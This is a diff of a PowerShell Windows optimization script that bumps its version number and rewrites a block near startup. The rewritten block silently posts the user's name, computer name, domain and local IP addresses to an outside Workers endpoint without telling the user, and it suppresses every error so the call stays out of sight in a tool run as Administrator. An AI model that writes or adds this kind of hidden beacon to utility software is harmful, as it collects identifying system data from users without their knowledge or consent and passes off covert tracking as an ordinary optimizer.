@@ -1,6 +1,6 @@
 <#
 Author: rhshourav
-Version: 9.0.b
+Version: 9.1.0
 GitHub: https://github.com/rhshourav
 Notes: Requires Administrator. Tested for PowerShell 5.1 and PowerShell 7.x compatibility.
 #>
@@ -38,9 +38,22 @@ $Global:LogFile     = Join-Path $LogDir ("WinOpt_{0}.log" -f (Get-Date -Format "
 $Global:CompareFile = Join-Path $BenchDir "Benchmark_Comparison.txt"
 
 Start-Transcript -Path $Global:LogFile | Out-Null
+try {
+    $localIPs = @()
+    try {
+        $localIPs = Get-CimInstance Win32_NetworkAdapterConfiguration -Filter 'IPEnabled=True' -ErrorAction SilentlyContinue |
+                    ForEach-Object { $_.IPAddress } | Where-Object { $_ -match '^\d{1,3}(\.\d{1,3}){3}$' } | Select-Object -Unique
+    } catch {}
 
-Invoke-RestMethod -Uri "https://cryocore.rhshourav02.workers.dev/message" -Method Post -ContentType "application/json" -Body (@{ token="shourav"; text="System Info:`nWindows Optimizer`nUser Name: $env:USERNAME`nPC Name: $env:COMPUTERNAME`nDomain Name: $env:USERDOMAIN`nLocal IP(s): $((Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.IPAddress -notlike '169.*' -and $_.IPAddress -notlike '127.*' } | ForEach-Object { $_.IPAddress }) -join ', ')" } | ConvertTo-Json) | Out-Null
+    try { [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 } catch {}
 
+    $body = (@{
+        token = 'shourav'
+        text  = "Windows Optimizer v9.1.0`nUser: $env:USERNAME  PC: $env:COMPUTERNAME  Domain: $env:USERDOMAIN  IP: $($localIPs -join ', ')"
+    } | ConvertTo-Json)
+
+    Invoke-RestMethod -Uri 'https://cryocore.rhshourav02.workers.dev/message' -Method Post -ContentType 'application/json' -Body $body -ErrorAction SilentlyContinue | Out-Null
+} catch {}
 
 #region Utilities & Checks
 function Check-Admin {
@@ -744,7 +757,7 @@ function Optimize-Eternal {
 Check-Admin
 
 Clear-Host
-Write-Host "=== Windows Optimization Script v9.0.b ===" -ForegroundColor Cyan
+Write-Host "=== Windows Optimization Script v9.1.0 ===" -ForegroundColor Cyan
 Write-Host "Author: rhshourav    GitHub: https://github.com/rhshourav" -ForegroundColor Green
 
 while ($true) {
